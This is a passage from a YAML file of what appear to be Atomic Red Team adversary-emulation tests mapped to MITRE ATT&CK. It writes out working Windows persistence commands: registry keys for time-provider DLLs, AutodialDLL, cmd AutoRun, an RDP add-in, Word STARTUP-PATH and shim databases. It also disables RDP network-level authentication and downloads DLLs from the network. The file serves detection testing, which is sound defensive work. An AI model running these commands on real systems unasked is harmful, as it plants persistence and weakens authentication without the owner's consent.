    Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"
    /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"
    /t REG_DWORD /v "Enabled" /d "1" /f

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"
    /t REG_DWORD /v "InputProvider" /d "1" /f

    net start w32time

    '
  description: 'Establishes persistence by creating a new time provider registry key
    under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.

    The new time provider will point to a DLL which will be loaded after the w32time
    service is started. The DLL will then create the file AtomicTest.txt

    in C:\Users\Public\ as validation that the test is successful.


    Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: &id011
    - 'Process: Process Creation'
    - 'Command: Command Execution'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Module: Module Load'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse time providers to execute DLLs when
      the system boots. The Windows Time service (W32Time) enables time synchronization
      across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time
      providers are responsible for retrieving time stamps from hardware/network resources
      and outputting these values to other network clients.(Citation: Microsoft TimeProvider)


      Time providers are implemented as dynamic-link libraries (DLLs) that are registered
      in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation:
      Microsoft TimeProvider) The time provider manager, directed by the service control
      manager, loads and starts time providers listed and enabled under this key at
      system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)


      Adversaries may abuse this architecture to establish persistence, specifically
      by creating a new arbitrarily named subkey  pointing to a malicious DLL in the
      `DllName` value. Administrator privileges are required for time provider registration,
      though execution will run in context of the Local Service account.(Citation:
      Github W32Time Oct 2017)'
    mitre_examples: []
    mitre_id: T1547.003
    mitre_mitigations: []
    mitre_name: Time Providers
    mitre_platforms: &id012
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/003
    - https://github.com/scottlundgren/w32time
    - https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings
    - https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top
    - https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Create a new time provider
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 29e0afca-8d1d-471a-8d34-25512fc48315
  cleanup_command: 'net stop w32time

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"
    /t REG_SZ /v "DllName" /d "C:\Windows\SYSTEM32\w32time.DLL" /f

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"
    /t REG_DWORD /v "Enabled" /d "0" /f

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"
    /t REG_DWORD /v "InputProvider" /d "0" /f

    rm -force C:\Users\Public\AtomicTest.dll

    net start w32time

    '
  command: 'net stop w32time

    Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"
    /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"
    /t REG_DWORD /v "Enabled" /d "1" /f

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"
    /t REG_DWORD /v "InputProvider" /d "1" /f

    net start w32time

    '
  description: 'Establishes persistence by editing the NtpServer time provider registry
    key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.

    The time provider will point to a DLL which will be loaded after the w32time service
    is started. The DLL will then create the file AtomicTest.txt

    in C:\Users\Public\ as validation that the test is successful.


    Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id011
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse time providers to execute DLLs when
      the system boots. The Windows Time service (W32Time) enables time synchronization
      across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time
      providers are responsible for retrieving time stamps from hardware/network resources
      and outputting these values to other network clients.(Citation: Microsoft TimeProvider)


      Time providers are implemented as dynamic-link libraries (DLLs) that are registered
      in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation:
      Microsoft TimeProvider) The time provider manager, directed by the service control
      manager, loads and starts time providers listed and enabled under this key at
      system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)


      Adversaries may abuse this architecture to establish persistence, specifically
      by creating a new arbitrarily named subkey  pointing to a malicious DLL in the
      `DllName` value. Administrator privileges are required for time provider registration,
      though execution will run in context of the Local Service account.(Citation:
      Github W32Time Oct 2017)'
    mitre_examples: []
    mitre_id: T1547.003
    mitre_mitigations: []
    mitre_name: Time Providers
    mitre_platforms: *id012
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/003
    - https://github.com/scottlundgren/w32time
    - https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings
    - https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top
    - https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Edit an existing time provider
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: aca9ae16-7425-4b6d-8c30-cad306fdbd5b
  cleanup_command: Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters
    -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
  command: 'Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters
    -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll

    '
  description: "The DLL pointed to by the AutodialDLL registry key is loaded every\
    \ time a process connects to the internet. Attackers can gain persistent code\
    \ execution by setting this key to a DLL of their choice. \n\nThe sample dll provided,\
    \ AltWinSock2DLL, will launch the notepad process. Starting and stopping a web\
    \ browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)\n"
  get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\T1546\bin\" -ErrorAction
    ignore | Out-Null

    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll"
    -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll"

    '
  input_arguments: {}
  mitre_info:
    mitre_data_sources: &id013
    - 'Module: Module Load'
    - 'WMI: WMI Creation'
    - 'File: File Metadata'
    - 'File: File Creation'
    - 'File: File Modification'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Command: Command Execution'
    - 'Cloud Service: Cloud Service Modification'
    - 'Process: Process Creation'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may establish persistence and/or elevate privileges
      using system mechanisms that trigger execution based on specific events. Various
      operating systems have means to monitor and subscribe to events such as logons
      or other user activity such as running specific applications/binaries. Cloud
      environments may also support various functions and services that monitor and
      can be invoked in response to specific cloud events.(Citation: Backdooring an
      AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft
      DART Case Report 001)


      Adversaries may abuse these mechanisms as a means of maintaining persistent
      access to a victim via repeatedly executing malicious code. After gaining access
      to a victim system, adversaries may create/modify event triggers to point to
      malicious content that will be executed whenever the event trigger is invoked.(Citation:
      FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)


      Since the execution can be proxied by an account with higher permissions, such
      as SYSTEM or service accounts, an adversary may be able to abuse these triggered
      execution mechanisms to escalate their privileges. '
    mitre_examples: []
    mitre_id: T1546
    mitre_mitigations: []
    mitre_name: Event Triggered Execution
    mitre_platforms: &id014
    - Linux
    - macOS
    - Windows
    - SaaS
    - IaaS
    - Office Suite
    mitre_references:
    - https://attack.mitre.org/techniques/T1546
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team
    - https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9
    - https://www.varonis.com/blog/power-automate-data-exfiltration
    - https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
    mitre_related_techniques: []
  name: Persistence with Custom AutodialDLL
  platforms:
  - windows
  prereq_command: 'if (Test-Path PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll)
    { exit 0} else { exit 1}

    '
  references: []
- atomic_id: a574dafe-a903-4cce-9701-14040f4f3532
  cleanup_command: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor"
    -Name "AutoRun" -ErrorAction Ignore
  command: New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name
    "AutoRun" -Value "#{command}" -PropertyType "String"
  description: 'An adversary may abuse the CommandProcessor AutoRun registry key to
    persist. Every time cmd.exe is executed, the command defined in the AutoRun key
    also gets executed.

    [reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)'
  get_prereq_command: ''
  input_arguments:
    command:
      default: notepad.exe
      description: Command to Execute
      type: string
  mitre_info:
    mitre_data_sources: *id013
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may establish persistence and/or elevate privileges
      using system mechanisms that trigger execution based on specific events. Various
      operating systems have means to monitor and subscribe to events such as logons
      or other user activity such as running specific applications/binaries. Cloud
      environments may also support various functions and services that monitor and
      can be invoked in response to specific cloud events.(Citation: Backdooring an
      AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft
      DART Case Report 001)


      Adversaries may abuse these mechanisms as a means of maintaining persistent
      access to a victim via repeatedly executing malicious code. After gaining access
      to a victim system, adversaries may create/modify event triggers to point to
      malicious content that will be executed whenever the event trigger is invoked.(Citation:
      FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)


      Since the execution can be proxied by an account with higher permissions, such
      as SYSTEM or service accounts, an adversary may be able to abuse these triggered
      execution mechanisms to escalate their privileges. '
    mitre_examples: []
    mitre_id: T1546
    mitre_mitigations: []
    mitre_name: Event Triggered Execution
    mitre_platforms: *id014
    mitre_references:
    - https://attack.mitre.org/techniques/T1546
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team
    - https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9
    - https://www.varonis.com/blog/power-automate-data-exfiltration
    - https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
    mitre_related_techniques: []
  name: HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 36b8dbf9-59b1-4e9b-a3bb-36e80563ef01
  cleanup_command: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Command Processor"
    -Name "AutoRun" -ErrorAction Ignore
  command: "$path = \"HKCU:\\Software\\Microsoft\\Command Processor\"\nif (!(Test-Path\
    \ -path $path)){\n  New-Item -ItemType Key -Path $path\n}\nNew-ItemProperty -Path\
    \ $path -Name \"AutoRun\" -Value \"#{command}\" -PropertyType \"String\""
  description: 'An adversary may abuse the CommandProcessor AutoRun registry key to
    persist. Every time cmd.exe is executed, the command defined in the AutoRun key
    also gets executed.

    [reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)'
  get_prereq_command: ''
  input_arguments:
    command:
      default: notepad.exe
      description: Command to Execute
      type: string
  mitre_info:
    mitre_data_sources: *id013
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may establish persistence and/or elevate privileges
      using system mechanisms that trigger execution based on specific events. Various
      operating systems have means to monitor and subscribe to events such as logons
      or other user activity such as running specific applications/binaries. Cloud
      environments may also support various functions and services that monitor and
      can be invoked in response to specific cloud events.(Citation: Backdooring an
      AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft
      DART Case Report 001)


      Adversaries may abuse these mechanisms as a means of maintaining persistent
      access to a victim via repeatedly executing malicious code. After gaining access
      to a victim system, adversaries may create/modify event triggers to point to
      malicious content that will be executed whenever the event trigger is invoked.(Citation:
      FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)


      Since the execution can be proxied by an account with higher permissions, such
      as SYSTEM or service accounts, an adversary may be able to abuse these triggered
      execution mechanisms to escalate their privileges. '
    mitre_examples: []
    mitre_id: T1546
    mitre_mitigations: []
    mitre_name: Event Triggered Execution
    mitre_platforms: *id014
    mitre_references:
    - https://attack.mitre.org/techniques/T1546
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team
    - https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9
    - https://www.varonis.com/blog/power-automate-data-exfiltration
    - https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
    mitre_related_techniques: []
  name: HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: b7fc4c3f-fe6e-479a-ba27-ef91b88536e3
  cleanup_command: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin"
    /f
  command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin"
    /v Path /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
  description: "When remote desktop session is accepted, the system queries the key\
    \ it queries the Registry key:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\
    \ Server\\AddIns\\TestDVCPlugin. \nIf such key exists, the OS will attempt to\
    \ read the Path value underneath.Once the Path is read, the DLL that it points\
    \ to will be loaded via LoadLibrary."
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id013
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may establish persistence and/or elevate privileges
      using system mechanisms that trigger execution based on specific events. Various
      operating systems have means to monitor and subscribe to events such as logons
      or other user activity such as running specific applications/binaries. Cloud
      environments may also support various functions and services that monitor and
      can be invoked in response to specific cloud events.(Citation: Backdooring an
      AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft
      DART Case Report 001)


      Adversaries may abuse these mechanisms as a means of maintaining persistent
      access to a victim via repeatedly executing malicious code. After gaining access
      to a victim system, adversaries may create/modify event triggers to point to
      malicious content that will be executed whenever the event trigger is invoked.(Citation:
      FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)


      Since the execution can be proxied by an account with higher permissions, such
      as SYSTEM or service accounts, an adversary may be able to abuse these triggered
      execution mechanisms to escalate their privileges. '
    mitre_examples: []
    mitre_id: T1546
    mitre_mitigations: []
    mitre_name: Event Triggered Execution
    mitre_platforms: *id014
    mitre_references:
    - https://attack.mitre.org/techniques/T1546
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team
    - https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9
    - https://www.varonis.com/blog/power-automate-data-exfiltration
    - https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
    mitre_related_techniques: []
  name: Persistence using automatic execution of custom DLL during RDP session
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 547a4736-dd1c-4b48-b4fe-e916190bb2e7
  cleanup_command: 'Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd      '
  command: 'Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination
    C:\Windows\Setup\Scripts\ErrorHandler.cmd

    C:\windows\System32\oobe\Setup

    '
  description: 'Create persistence by triggering script within ErrorHandler.cmd upon
    the execution of specific binaries within the oobe directory.

    Upon test execution, Setup.exe will be executed to further execute script within
    ErrorHandlercmd to launch Notepad.

    '
  get_prereq_command: "New-Item -Type Directory \"PathToAtomicsFolder\\T1546\\src\\\
    \" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/src/ErrorHandler.cmd\"\
    \ -OutFile \"PathToAtomicsFolder\\T1546\\src\\ErrorHandler.cmd\"      \n"
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id013
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may establish persistence and/or elevate privileges
      using system mechanisms that trigger execution based on specific events. Various
      operating systems have means to monitor and subscribe to events such as logons
      or other user activity such as running specific applications/binaries. Cloud
      environments may also support various functions and services that monitor and
      can be invoked in response to specific cloud events.(Citation: Backdooring an
      AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft
      DART Case Report 001)


      Adversaries may abuse these mechanisms as a means of maintaining persistent
      access to a victim via repeatedly executing malicious code. After gaining access
      to a victim system, adversaries may create/modify event triggers to point to
      malicious content that will be executed whenever the event trigger is invoked.(Citation:
      FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)


      Since the execution can be proxied by an account with higher permissions, such
      as SYSTEM or service accounts, an adversary may be able to abuse these triggered
      execution mechanisms to escalate their privileges. '
    mitre_examples: []
    mitre_id: T1546
    mitre_mitigations: []
    mitre_name: Event Triggered Execution
    mitre_platforms: *id014
    mitre_references:
    - https://attack.mitre.org/techniques/T1546
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team
    - https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9
    - https://www.varonis.com/blog/power-automate-data-exfiltration
    - https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
    mitre_related_techniques: []
  name: Persistence via ErrorHandler.cmd script execution
  platforms:
  - windows
  prereq_command: 'if (Test-Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd) {
    exit 0} else { exit 1}

    '
  references: []
- atomic_id: f0027655-25ef-47b0-acaf-3d83d106156c
  cleanup_command: reg delete HKCU\Software\Microsoft\Office\16.0\Word\Options /v
    STARTUP-PATH /f
  command: reg add "HKCU\Software\Microsoft\Office\16.0\Word\Options" /v STARTUP-PATH
    /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent" /f
  description: 'When Word starts, it searches for the registry key HKCU\Software\Microsoft\Office\<version>\Word\Options\STARTUP-PATH
    and if it exists,

    it will treat it as a user specific start-up folder and load the contents of the
    folder with file extensions of .wll,.lnk,.dotm,.dot,.dotx

    The registry key can be abused to load malware from the mentioned path. Reboot
    might be required.'
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: *id013
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may establish persistence and/or elevate privileges
      using system mechanisms that trigger execution based on specific events. Various
      operating systems have means to monitor and subscribe to events such as logons
      or other user activity such as running specific applications/binaries. Cloud
      environments may also support various functions and services that monitor and
      can be invoked in response to specific cloud events.(Citation: Backdooring an
      AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft
      DART Case Report 001)


      Adversaries may abuse these mechanisms as a means of maintaining persistent
      access to a victim via repeatedly executing malicious code. After gaining access
      to a victim system, adversaries may create/modify event triggers to point to
      malicious content that will be executed whenever the event trigger is invoked.(Citation:
      FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)


      Since the execution can be proxied by an account with higher permissions, such
      as SYSTEM or service accounts, an adversary may be able to abuse these triggered
      execution mechanisms to escalate their privileges. '
    mitre_examples: []
    mitre_id: T1546
    mitre_mitigations: []
    mitre_name: Event Triggered Execution
    mitre_platforms: *id014
    mitre_references:
    - https://attack.mitre.org/techniques/T1546
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team
    - https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9
    - https://www.varonis.com/blog/power-automate-data-exfiltration
    - https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf
    mitre_related_techniques: []
  name: Persistence using STARTUP-PATH in MS-WORD
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 01d1c6c0-faf0-408e-b368-752a02285cb2
  cleanup_command: 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
    Server\WinStations\RDP-Tcp" /v UserAuthentication /d #{Default_UserAuthentication}
    /t REG_DWORD -f >nul 2>&1

    '
  command: 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
    Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f

    '
  description: 'Disables network-level authentication (NLA) for RDP by changing a
    registry key via Command Prompt

    Disabling NLA for RDP can allow remote user interaction with the Windows sign-in
    screen prior to authentication. According to Microsoft, Flax Typhoon actors used
    this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/

    See also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py

    '
  get_prereq_command: ''
  input_arguments:
    Default_UserAuthentication:
      default: '1'
      description: Default UserAuthentication registry value
      type: string
  mitre_info:
    mitre_data_sources:
    - 'Network Traffic: Network Traffic Flow'
    - 'Logon Session: Logon Session Creation'
    - 'Network Traffic: Network Connection Creation'
    - 'Process: Process Creation'
    - 'Logon Session: Logon Session Metadata'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into a computer using the Remote Desktop Protocol (RDP). The adversary\
      \ may then perform actions as the logged-on user.\n\nRemote desktop is a common\
      \ feature in operating systems. It allows a user to log into an interactive\
      \ session with a system desktop graphical user interface on a remote system.\
      \ Microsoft refers to its implementation of the Remote Desktop Protocol (RDP)\
      \ as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\
      \ \n\nAdversaries may connect to a remote system over RDP/RDS to expand access\
      \ if the service is enabled and allows access to accounts with known credentials.\
      \ Adversaries will likely use Credential Access techniques to acquire credentials\
      \ to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility\
      \ Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services\
      \ DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation:\
      \ Alperovitch Malware)"
    mitre_examples: []
    mitre_id: T1021.001
    mitre_mitigations: []
    mitre_name: Remote Desktop Protocol
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1021/001
    - http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/
    - https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx
    mitre_related_techniques: []
  name: Disable NLA for RDP via Command Prompt
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: aefd6866-d753-431f-a7a4-215ca7e3f13d
  cleanup_command: 'Remove-Item C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb
    -ErrorAction Ignore

    Remove-Item C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb -ErrorAction
    Ignore

    '
  command: 'Copy-Item "$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb"
    C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb

    Copy-Item "$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb" C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb

    '
  description: 'Upon execution, check the "C:\Windows\apppatch\Custom\" folder for
    the new shim database


    https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: &id015
    - 'File: File Modification'
    - 'Module: Module Load'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Command: Command Execution'
    - 'Process: Process Creation'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence and/or elevate privileges\
      \ by executing malicious content triggered by application shims. The Microsoft\
      \ Windows Application Compatibility Infrastructure/Framework (Application Shim)\
      \ was created to allow for backward compatibility of software as the operating\
      \ system codebase changes over time. For example, the application shimming feature\
      \ allows developers to apply fixes to applications (without rewriting code)\
      \ that were created for Windows XP so that it will work with Windows 10. (Citation:\
      \ Elastic Process Injection July 2017)\n\nWithin the framework, shims are created\
      \ to act as a buffer between the program (or more specifically, the Import Address\
      \ Table) and the Windows OS. When a program is executed, the shim cache is referenced\
      \ to determine if the program requires the use of the shim database (.sdb).\
      \ If so, the shim database uses hooking to redirect the code as necessary in\
      \ order to communicate with the OS. \n\nA list of all shims currently installed\
      \ by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\\
      AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows\
      \ nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases\
      \ are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\\
      AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\\
      currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows\
      \ designed them to run in user mode so they cannot modify the kernel and you\
      \ must have administrator privileges to install a shim. However, certain shims\
      \ can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)\
      \ (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data\
      \ Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),\
      \ and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims\
      \ may allow an adversary to perform several malicious acts such as elevate privileges,\
      \ install backdoors, disable defenses like Windows Defender, etc. (Citation:\
      \ FireEye Application Shimming) Shims can also be abused to establish persistence\
      \ by continuously being invoked by affected programs."
    mitre_examples: []
    mitre_id: T1546.011
    mitre_mitigations: []
    mitre_name: Application Shimming
    mitre_platforms: &id016
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/011
    - https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
    - http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf
    - https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf
    mitre_related_techniques: []
  name: New shim database files created in the default shim database directory
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 9b6a06f9-ab5e-4e8d-8289-1df4289db02f
  cleanup_command: 'Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"
    -Name "AtomicRedTeamT1546.011" -ErrorAction Ignore

    Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"
    -Name "AtomicRedTeamT1546.011" -ErrorAction Ignore

    '
  command: 'New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom"
    -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"

    New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"
    -Name "AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"

    '
  description: 'Create registry keys in locations where fin7 typically places SDB
    patches. Upon execution, output will be displayed describing

    the registry keys that were created. These keys can also be viewed using the Registry
    Editor.


